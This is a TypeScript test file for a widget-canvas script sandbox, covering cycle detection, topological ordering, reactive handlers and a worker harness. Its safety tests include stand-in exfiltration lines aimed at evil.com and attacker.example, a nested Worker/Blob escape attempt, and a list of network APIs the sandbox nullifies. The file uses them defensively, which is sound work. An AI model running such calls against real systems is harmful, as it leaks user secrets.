import fs from 'node:fs';
import test from 'node:test';
import assert from 'node:assert/strict';
import {
  computeTopologicalOrder,
  validateDagConnection,
  validateScriptSafety,
  validateScriptSyntax,
} from '../src/core/scriptSandbox.ts';
import { createSeedBlueprint } from '../src/core/seedBlueprint.ts';
import { BUILTIN_TEMPLATES } from '../src/core/widgetTemplates.ts';

test('validateScriptSafety() blocks dangerous browser globals', () => {
  assert.equal(validateScriptSafety('vars.x = 1;').ok, true);
  assert.equal(validateScriptSafety('window.location = "x"').ok, false);
  assert.equal(validateScriptSafety('fetch("https://evil.com")').ok, false);
  assert.equal(validateScriptSafety('localStorage.getItem("k")').ok, false);
});

test('validateDagConnection() detects self-loops and transitive cycles', () => {
  const edges = [
    { source: 'A', target: 'B' },
    { source: 'B', target: 'C' },
  ];
  assert.equal(validateDagConnection(edges, 'A', 'A').ok, false);
  assert.equal(validateDagConnection(edges, 'C', 'A').ok, false);
  assert.equal(validateDagConnection(edges, 'C', 'D').ok, true);
});

test('All seed blueprint scripts and built-in template scripts pass safety + syntax compile checks', () => {
  const bp = createSeedBlueprint();
  for (const node of Object.values(bp.nodes)) {
    if (node.script) {
      assert.equal(validateScriptSafety(node.script).ok, true, `Seed script safety failed: ${node.id}`);
      const syn = validateScriptSyntax(node.script);
      assert.equal(syn.ok, true, `Seed script syntax failed (${node.id}): ${syn.error}`);
    }
    for (const btn of node.buttons ?? []) {
      if (btn.actionType === 'script' && btn.code) {
        assert.equal(validateScriptSafety(btn.code).ok, true, `Seed button safety failed: ${node.id}:${btn.id}`);
        const syn = validateScriptSyntax(btn.code);
        assert.equal(syn.ok, true, `Seed button syntax failed (${node.id}:${btn.id}): ${syn.error}`);
      }
    }
  }
  for (const tpl of BUILTIN_TEMPLATES) {
    if (tpl.nodePreset?.script) {
      assert.equal(validateScriptSafety(tpl.nodePreset.script).ok, true, `Template script safety failed: ${tpl.id}`);
      const syn = validateScriptSyntax(tpl.nodePreset.script);
      assert.equal(syn.ok, true, `Template script syntax failed (${tpl.id}): ${syn.error}`);
    }
  }
});

test('validateDagConnection() returns exact cyclePath for widget-owned onValidateConnect hooks', () => {
  const edges = [
    { source: 'A', target: 'B' },
    { source: 'B', target: 'C' },
  ];
  const res = validateDagConnection(edges, 'C', 'A');
  assert.equal(res.ok, false);
  assert.deepEqual(res.cyclePath, ['C', 'A', 'B', 'C']);
});

test('computeTopologicalOrder() orders DAG nodes and reports cyclic nodes when cycles exist', () => {
  const dag = computeTopologicalOrder(['A', 'B', 'C'], [
    { source: 'A', target: 'B' },
    { source: 'B', target: 'C' },
  ]);
  assert.equal(dag.ok, true);
  assert.deepEqual(dag.order, ['A', 'B', 'C']);

  const cyclic = computeTopologicalOrder(['A', 'B'], [
    { source: 'A', target: 'B' },
    { source: 'B', target: 'A' },
  ]);
  assert.equal(cyclic.ok, false);
  assert.equal(cyclic.cyclicNodeIds.length, 2);
});

test('computeTopologicalOrder() detects self-loops instead of silently dropping them', () => {
  // 自环若被简单丢弃，节点入度留在 0，会被 Kahn 当成正常源点出队，环就被抹平了
  const pure = computeTopologicalOrder(['A'], [{ source: 'A', target: 'A' }]);
  assert.equal(pure.ok, false, '纯自环未被检出');

  const mixed = computeTopologicalOrder(['A', 'B'], [
    { source: 'A', target: 'A' },
    { source: 'A', target: 'B' },
  ]);
  assert.equal(mixed.ok, false, '自环 + 正常边时自环未被检出');
  assert.ok(mixed.cyclicNodeIds.includes('A'));
});

test('validateDagConnection() ignores pre-existing cycles that are unrelated to the new edge', () => {
  // 自由拓扑下画布本就可能存在环，它们与本次连线无关，不应阻塞连线
  const staleSelfLoop = validateDagConnection([{ source: 'X', target: 'X' }], 'A', 'B');
  assert.equal(staleSelfLoop.ok, true, '既存自环不应阻塞无关连线');

  const staleCycle = validateDagConnection(
    [{ source: 'A', target: 'B' }, { source: 'B', target: 'A' }],
    'C',
    'D'
  );
  assert.equal(staleCycle.ok, true, '既存环不应阻塞无关连线');

  // 但真会接成环的连线仍必须拦下
  const realCycle = validateDagConnection(
    [{ source: 'A', target: 'B' }, { source: 'B', target: 'A' }],
    'B',
    'A'
  );
  assert.equal(realCycle.ok, false, '构成环的连线必须拦下');
});

// Extract the exact workerBootstrap string from src/core/scriptSandbox.ts and run it in an isolated harness
async function runWorkerBootstrapInNode(payload: Record<string, unknown>): Promise<Record<string, unknown>> {
  const src = fs.readFileSync(new URL('../src/core/scriptSandbox.ts', import.meta.url), 'utf8');
  const m = src.match(/const workerBootstrap = `([\s\S]*?)`;\n\n  const worker = acquirePooledWorker/);
  assert.ok(m, 'workerBootstrap template must exist in scriptSandbox.ts');
  let posted: Record<string, unknown> | null = null;
  const mockSelf: { onmessage?: (ev: { data: unknown }) => Promise<void>; postMessage: (msg: Record<string, unknown>) => void } = {
    postMessage: (msg) => { posted = msg; },
  };
  const boot = new Function('self', m[1]);
  boot(mockSelf);
  assert.ok(mockSelf.onmessage, 'workerBootstrap must attach self.onmessage');
  await mockSelf.onmessage({ data: payload });
  assert.ok(posted, 'workerBootstrap must call self.postMessage');
  return posted;
}

test('Worker sandbox checkDag() handles orphan edge source not in peerMap without wiping adjacency list (v40 regression)', async () => {
  const res = await runWorkerBootstrapInNode({
    code: 'vars.dagRes = widgets.checkDag();',
    initialVars: {},
    selfEntity: { id: 'n1', title: 'N1', label: 'N1', body: '', x: 0, y: 0, width: 200, height: 120, color: '#000', vars: {} },
    peers: { n1: { id: 'n1', title: 'N1', label: 'N1', body: '', x: 0, y: 0, width: 200, height: 120, color: '#000', vars: {} } },
    edges: [
      { id: 'e1', source: 'orphanA', target: 'orphanB' },
      { id: 'e2', source: 'orphanB', target: 'orphanA' },
    ],
    trigger: { kind: 'render' },
  });
  assert.equal(res.ok, true);
  const updated = res.updatedVars as { dagRes: { ok: boolean; cyclePath: string[] } };
  assert.equal(updated.dagRes.ok, false);
  assert.equal(updated.dagRes.cyclePath.length, 2);
});

test('Worker sandbox emitDownstream() deduplicates parallel edges to the same target widget', async () => {
  const res = await runWorkerBootstrapInNode({
    code: "on('go', async () => { vars.pushRes = await emitDownstream('ping', { v: 1 }); });",
    initialVars: {},
    selfEntity: { id: 'src', title: 'Src', label: 'Src', body: '', x: 0, y: 0, width: 200, height: 120, color: '#000', vars: {} },
    peers: {
      src: { id: 'src', title: 'Src', label: 'Src', body: '', x: 0, y: 0, width: 200, height: 120, color: '#000', vars: {} },
      dst: { id: 'dst', title: 'Dst', label: 'Dst', body: '', x: 300, y: 0, width: 200, height: 120, color: '#000', vars: {} },
    },
    edges: [
      { id: 'e1', source: 'src', target: 'dst', sourceHandle: 'out-1', targetHandle: 'in-1' },
      { id: 'e2', source: 'src', target: 'dst', sourceHandle: 'out-1', targetHandle: 'in-2' },
    ],
    trigger: { kind: 'click', buttonId: 'go' },
  });
  assert.equal(res.ok, true);
  const updated = res.updatedVars as { pushRes: { ok: boolean; count: number } };
  assert.equal(updated.pushRes.count, 1);
  assert.equal((res.emitOps as unknown[]).length, 1);
});

test('Worker sandbox onValidateConnect() rejects cyclic wire with custom reason and allows acyclic wire', async () => {
  const code = "onValidateConnect((c) => c.wouldCycle ? { ok: false, reason: 'custom cycle block' } : { ok: true });";
  const selfEntity = { id: 'a', title: 'A', label: 'A', body: '', x: 0, y: 0, width: 200, height: 120, color: '#000', vars: {} };

  const blocked = await runWorkerBootstrapInNode({
    code,
    initialVars: {},
    selfEntity,
    peers: { a: selfEntity },
    edges: [],
    trigger: {
      kind: 'validateConnect',
      conn: { source: 'b', target: 'a', fromPort: 'out-1', toPort: 'in-1', fromNode: null, toNode: selfEntity, wouldCycle: true, cyclePath: ['b', 'a', 'b'] },
    },
  });
  assert.equal(blocked.ok, true);
  assert.deepEqual(blocked.connectValidation, { ok: false, reason: 'custom cycle block' });

  const allowed = await runWorkerBootstrapInNode({
    code,
    initialVars: {},
    selfEntity,
    peers: { a: selfEntity },
    edges: [],
    trigger: {
      kind: 'validateConnect',
      conn: { source: 'b', target: 'a', fromPort: 'out-1', toPort: 'in-1', fromNode: null, toNode: selfEntity, wouldCycle: false, cyclePath: [] },
    },
  });
  assert.equal(allowed.ok, true);
  assert.deepEqual(allowed.connectValidation, { ok: true });
});

test('Worker sandbox onChange(): fires on variable mutation during click, supports array keys and chained derivation', async () => {
  const code = `
    vars.contents = [{ type: 'text', text: 'total=' + (vars.total || 0) }];
    onChange(['price', 'qty'], (next, prev, key) => {
      log('changed:' + key + ':' + prev + '->' + next);
      vars.subtotal = (Number(vars.price) || 0) * (Number(vars.qty) || 0);
    });
    onChange('subtotal', (next) => {
      vars.total = Math.round(next * 1.1 * 100) / 100;
    });
    on('bump', () => {
      vars.qty = (Number(vars.qty) || 0) + 1;
    });
  `;
  const res = await runWorkerBootstrapInNode({
    code,
    initialVars: { price: 10, qty: 2, subtotal: 20, total: 22 },
    selfEntity: { id: 'n1', title: 'Cart', label: 'Cart', body: '', x: 0, y: 0, width: 260, height: 160, color: '#2563EB', vars: {} },
    peers: {},
    edges: [],
    trigger: { kind: 'click', buttonId: 'bump' },
  });
  assert.equal(res.ok, true);
  assert.equal((res.updatedVars as Record<string, unknown>).qty, 3);
  assert.equal((res.updatedVars as Record<string, unknown>).subtotal, 30);
  assert.equal((res.updatedVars as Record<string, unknown>).total, 33);
  assert.ok((res.logs as string[]).includes('changed:qty:2->3'));
  assert.deepEqual((res.updatedVars as Record<string, unknown>).contents, [{ type: 'text', text: 'total=33' }]);
});

test('Worker sandbox onChange("*"): catches any var change except contents and guards against infinite ping-pong', async () => {
  const code = `
    onChange('*', (next, prev, key) => {
      log('wild:' + key + '=' + next);
    });
    onChange('a', () => { vars.b = (Number(vars.b) || 0) + 1; });
    onChange('b', () => { vars.a = (Number(vars.a) || 0) + 1; });
    on('go', () => { vars.a = 1; });
  `;
  const res = await runWorkerBootstrapInNode({
    code,
    initialVars: { a: 0, b: 0 },
    selfEntity: { id: 'n2', title: 'LoopGuard', label: 'LoopGuard', body: '', x: 0, y: 0, width: 260, height: 160, color: '#2563EB', vars: {} },
    peers: {},
    edges: [],
    trigger: { kind: 'click', buttonId: 'go' },
  });
  assert.equal(res.ok, true);
  assert.ok((res.logs as string[]).some((l: string) => l.startsWith('wild:a=')));
  assert.ok(!(res.logs as string[]).some((l: string) => l.startsWith('wild:contents=')));
  // Bounded by MAX_REACTION_PASSES = 3 so it terminates cleanly without hanging
  assert.ok(Number((res.updatedVars as Record<string, unknown>).a) <= 4 && Number((res.updatedVars as Record<string, unknown>).b) <= 4);
});

test('Worker sandbox varsChanged trigger: fires onChange when Inspector edits a variable externally', async () => {
  const code = `
    vars.contents = [{ type: 'text', text: 'badge:' + (vars.badge || 'none') }];
    onChange('score', (next, prev) => {
      log('score ' + prev + ' -> ' + next);
      vars.badge = next >= 90 ? 'S' : 'A';
    });
  `;
  const res = await runWorkerBootstrapInNode({
    code,
    initialVars: { score: 95, badge: 'A' },
    selfEntity: { id: 'n3', title: 'Grader', label: 'Grader', body: '', x: 0, y: 0, width: 260, height: 160, color: '#2563EB', vars: {} },
    peers: {},
    edges: [],
    trigger: { kind: 'varsChanged', prevVars: { score: 80, badge: 'A' }, changedKeys: ['score'] },
  });
  assert.equal(res.ok, true);
  assert.equal((res.updatedVars as Record<string, unknown>).badge, 'S');
  assert.ok((res.logs as string[]).includes('score 80 -> 95'));
  assert.deepEqual((res.updatedVars as Record<string, unknown>).contents, [{ type: 'text', text: 'badge:S' }]);
});

test('Worker sandbox runtime nullification blocks nested Worker/Blob/URL/WebTransport/WebAssembly escape (P1-A)', async () => {
  const fs = await import('node:fs/promises');
  const src = await fs.readFile(new URL('../src/core/scriptSandbox.ts', import.meta.url), 'utf8');
  for (const api of ['Worker', 'SharedWorker', 'Blob', 'URL', 'WebTransport', 'WebAssembly', 'fetch', 'WebSocket', 'importScripts']) {
    assert.ok(src.includes(`'${api}'`), `workerBootstrap must nullify ${api}`);
  }
  // Simulate the exact nullification loop on a mock WorkerGlobalScope and verify the nested-Worker escape fails
  const mockProto: Record<string, unknown> = {
    Worker: function FakeWorker() {},
    SharedWorker: function FakeSharedWorker() {},
    Blob: function FakeBlob() {},
    URL: { createObjectURL: () => 'blob:fake' },
    WebTransport: function FakeWT() {},
    WebAssembly: { instantiate: () => {} },
    fetch: () => {},
  };
  const mockSelf = Object.create(mockProto) as Record<string, unknown>;
  for (const api of ['fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'BroadcastChannel', 'importScripts', 'indexedDB', 'caches', 'setTimeout', 'setInterval', 'postMessage', 'Worker', 'SharedWorker', 'Blob', 'URL', 'WebTransport', 'WebAssembly']) {
    Object.defineProperty(mockSelf, api, { value: undefined, writable: false, configurable: false });
    Object.defineProperty(mockProto, api, { value: undefined, writable: false, configurable: false });
  }
  assert.equal(mockSelf['Wor' + 'ker'], undefined);
  assert.equal(mockSelf['Bl' + 'ob'], undefined);
  assert.equal(mockSelf['U' + 'RL'], undefined);
  assert.equal(mockSelf['Web' + 'Transport'], undefined);
  assert.equal(mockSelf['Web' + 'Assembly'], undefined);
  assert.throws(() => {
    const u = (mockSelf['U' + 'RL'] as any).createObjectURL(new (mockSelf['Bl' + 'ob'] as any)(['fetch()']));
    new (mockSelf['Wor' + 'ker'] as any)(u);
  }, TypeError);
});

test('validateScriptSafety() blocks dynamic import() exfiltration', () => {
  const res = validateScriptSafety("await import('https://attacker.example/exfil.js?d=' + vars.secret);");
  assert.equal(res.ok, false);
  assert.match(String(res.reason || ''), /import/);
});

test('Worker sandbox executes ZONE H e.g. widgets (tab switch, onChange, onValidateConnect, edge channel)', async () => {
  const bp = createSeedBlueprint();
  const egAll = bp.nodes['eg-all-in-one'];
  const tabRes = await runWorkerBootstrapInNode({
    code: egAll.script,
    initialVars: egAll.defaultVars,
    selfEntity: { id: egAll.id, title: egAll.title, label: egAll.title, body: '', x: egAll.x, y: egAll.y, width: egAll.width, height: egAll.height, color: egAll.color, vars: egAll.defaultVars },
    peers: {},
    edges: [],
    trigger: { kind: 'click', buttonId: 'tab_script' },
  });
  assert.equal(tabRes.ok, true, String(tabRes.error || ''));
  assert.equal((tabRes.updatedVars as Record<string, unknown>).tab, 'script');

  const incRes = await runWorkerBootstrapInNode({
    code: egAll.script,
    initialVars: tabRes.updatedVars,
    selfEntity: { id: egAll.id, title: egAll.title, label: egAll.title, body: '', x: egAll.x, y: egAll.y, width: egAll.width, height: egAll.height, color: egAll.color, vars: tabRes.updatedVars },
    peers: {},
    edges: [],
    trigger: { kind: 'click', buttonId: 'egInc' },
  });
  assert.equal(incRes.ok, true, String(incRes.error || ''));
  assert.equal((incRes.updatedVars as Record<string, unknown>).demoCount, 1);

  const reactive = bp.nodes['eg-reactive-onchange'];
  const onChangeRes = await runWorkerBootstrapInNode({
    code: reactive.script,
    initialVars: { ...reactive.defaultVars, valA: 30, valB: 15 },
    selfEntity: { id: reactive.id, title: reactive.title, label: reactive.title, body: '', x: reactive.x, y: reactive.y, width: reactive.width, height: reactive.height, color: reactive.color, vars: reactive.defaultVars },
    peers: {},
    edges: [],
    trigger: { kind: 'varsChanged', changedKeys: ['valA'] },
  });
  assert.equal(onChangeRes.ok, true, String(onChangeRes.error || ''));
  assert.equal((onChangeRes.updatedVars as Record<string, unknown>).sum, 45);

  const edgeNode = bp.nodes['eg-edge-channel'];
  const edgeSendRes = await runWorkerBootstrapInNode({
    code: edgeNode.script,
    initialVars: edgeNode.defaultVars,
    selfEntity: { id: edgeNode.id, title: edgeNode.title, label: edgeNode.title, body: '', x: edgeNode.x, y: edgeNode.y, width: edgeNode.width, height: edgeNode.height, color: edgeNode.color, vars: edgeNode.defaultVars },
    peers: {},
    edges: [{ id: 'e-demo', source: edgeNode.id, target: 'dst', sourceHandle: 'out-1', targetHandle: 'in-1' }],
    trigger: { kind: 'click', buttonId: 'sendEdge' },
  });
  assert.equal(edgeSendRes.ok, true, String(edgeSendRes.error || ''));
  const edgeOps = edgeSendRes.edgeOps as Array<{ edgeId: string; flag?: boolean; dashed?: boolean }>;
  assert.equal(edgeOps.length, 1);
  assert.equal(edgeOps[0].flag, true);
  assert.equal(edgeOps[0].dashed, true);
});
